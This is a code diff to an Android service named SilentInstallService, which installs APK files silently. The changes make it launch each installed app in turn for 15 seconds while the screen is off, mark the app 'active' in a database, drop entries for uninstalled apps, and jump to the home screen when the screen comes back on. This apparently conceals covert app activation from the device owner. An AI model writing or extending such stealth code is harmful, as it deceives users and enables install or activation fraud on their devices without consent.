@@ -6,8 +6,9 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.List;
 
-import android.app.ActivityManager;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -78,13 +79,13 @@ public class SilentInstallService extends Service {
         if (receiver != null)
             unregisterReceiver(receiver);
     }
-
+    
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        String apk_path = intent.getStringExtra("apk_path");
+    public void onStart(Intent intent, int startId) {
+    	super.onStart(intent, startId);
+    	String apk_path = intent.getStringExtra("apk_path");
         if (apk_path != null)
             installFile(new File(apk_path));
-        return super.onStartCommand(intent, flags, startId);
     }
 
     class ScreenChangeReceiver extends BroadcastReceiver {
@@ -94,6 +95,7 @@ public class SilentInstallService extends Service {
             String action = intent.getAction();
             if (Intent.ACTION_SCREEN_ON.equals(action)) {
                 active = false;
+                goHome();
             } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                 activeApp();
             } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
@@ -108,11 +110,21 @@ public class SilentInstallService extends Service {
 
     private String packageName;
     private boolean active;
+    private List<String> packgeNames = new ArrayList<String>();
 
     /**
      * 激活安装的程序
      */
     private void activeApp() {
+    	packgeNames.clear();
+    	try {
+    		List<PackageInfo> pis = manager.getInstalledPackages(PackageManager.GET_ACTIVITIES);
+    		for (PackageInfo pi : pis) {
+    			packgeNames.add(pi.packageName);
+    		}
+		} catch (RemoteException e) {
+			e.printStackTrace();
+		}
     	
         new Thread(new Runnable() {
             @Override
@@ -124,26 +136,40 @@ public class SilentInstallService extends Service {
                 while (active && cursor.moveToNext()) {
                 	long id = cursor.getLong(0);
                     String packname = cursor.getString(1);
+                    if(!packgeNames.contains(packname)) {
+                    	Log.w("ps", packname + "not active, it's uninstall, delete it in db.");
+                    	SilenceApp entity = new SilenceApp();
+                    	entity.setId(id);
+                    	entity.setPackagename(packname);
+                    	dao.delete(entity);
+                    	break;
+                    }
                     packageName = packname;
-                    Log.w("ps", "开始激活：" + packageName);
                     Intent app = getPackageManager().getLaunchIntentForPackage(packname);
                     startActivity(app);
-                    SystemClock.sleep(5000);
+                    SystemClock.sleep(15000);
                     SilenceApp entity = new SilenceApp();
                     entity.setId(id);
                     entity.setPackagename(packname);
                     entity.setActive(true);
                     dao.update(entity);
                     if (packageName != null) {
-                    	Log.w("ps", "数据库修改完成，关禁程序。");
-                    	ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-                        am.killBackgroundProcesses(packageName);
+                    	goHome();
+//                    	ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+//                      am.killBackgroundProcesses(packageName);
                     }
                 }
                 if (cursor != null)
                     cursor.close();
             }
         }).start();
+    }
+    
+    public void goHome() {
+        Intent i= new Intent(Intent.ACTION_MAIN);
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        i.addCategory(Intent.CATEGORY_HOME);
+        startActivity(i);
     }
 
     private void installFile(File file) {
@@ -218,7 +244,7 @@ public class SilentInstallService extends Service {
                         os.flush();
                         installFile(file);
                     }
-                } catch (Exception e) {
+                 } catch (Exception e) {
                     e.printStackTrace();
                 } finally {
                     try {
